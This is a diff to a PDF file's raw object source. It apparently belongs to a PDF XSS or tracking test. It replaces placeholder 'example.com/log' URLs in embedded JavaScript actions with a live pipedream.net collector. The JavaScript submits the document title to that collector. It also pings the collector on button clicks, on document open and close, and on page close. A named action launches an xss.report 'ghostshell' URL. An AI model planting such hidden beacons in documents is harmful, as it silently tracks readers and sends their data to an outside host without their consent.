@@ -31,7 +31,7 @@ endobj
 << /Names [(FormXSS) 11 0 R (Base64XSS) 12 0 R (ObfXSS) 13 0 R] >>
 endobj
 11 0 obj
-<< /S /JavaScript /JS (this.submitForm({ cURL: 'https://example.com/log', cSubmitAs: 'HTML', cFields: [['title', app.doc.title]] });) >>
+<< /S /JavaScript /JS (this.submitForm({ cURL: 'https://eoy4evvlsf7y0jq.m.pipedream.net', cSubmitAs: 'HTML', cFields: [['title', app.doc.title], ['timestamp', '2025-05-30T16:06:00EEST']] });) >>
 endobj
 12 0 obj
 << /S /JavaScript /JS (setTimeout(function() { app.launchURL('https://xss.report/c/ghostshell', true); }, 3000);) >>
@@ -54,16 +54,16 @@ endobj
 << /Type /Annot /Subtype /Link /Rect [100 400 200 420] /A << /S /URI /URI (https://gotphp.com/) >> /Border [0 0 1] /C [0 0 1] >>
 endobj
 18 0 obj
-<< /Type /Annot /Subtype /Widget /FT /Btn /T (SimClickBtn) /Rect [150 500 250 520] /A << /S /JavaScript /JS (var t = event.target; getURL('https://example.com/log?click=' + encodeURIComponent(t.name));) >> >>
+<< /Type /Annot /Subtype /Widget /FT /Btn /T (SimClickBtn) /Rect [150 500 250 520] /A << /S /JavaScript /JS (var t = event.target; getURL('https://eoy4evvlsf7y0jq.m.pipedream.net?click=' + encodeURIComponent(t.name));) >> >>
 endobj
 19 0 obj
-<< /Type /Annot /Subtype /Widget /FT /Btn /T (TimeBtn) /Rect [150 450 250 470] /A << /S /JavaScript /JS (for (var i = 0; i < 3; i++) { getURL('https://example.com/log?time=' + i); util.sleep(2000); }) >> >>
+<< /Type /Annot /Subtype /Widget /FT /Btn /T (TimeBtn) /Rect [150 450 250 470] /A << /S /JavaScript /JS (for (var i = 0; i < 3; i++) { getURL('https://eoy4evvlsf7y0jq.m.pipedream.net?time=' + i); util.sleep(2000); }) >> >>
 endobj
 20 0 obj
-<< /O << /S /JavaScript /JS (getURL('https://example.com/log?open=true');) >> /WC << /S /JavaScript /JS (getURL('https://example.com/log?close=true');) >> >>
+<< /O << /S /JavaScript /JS (getURL('https://eoy4evvlsf7y0jq.m.pipedream.net?open=true');) >> /WC << /S /JavaScript /JS (getURL('https://eoy4evvlsf7y0jq.m.pipedream.net?close=true');) >> >>
 endobj
 21 0 obj
-<< /PC << /S /JavaScript /JS (getURL('https://example.com/log?pageclose=true');) >> >>
+<< /PC << /S /JavaScript /JS (getURL('https://eoy4evvlsf7y0jq.m.pipedream.net?pageclose=true');) >> >>
 endobj
 xref
 0 22
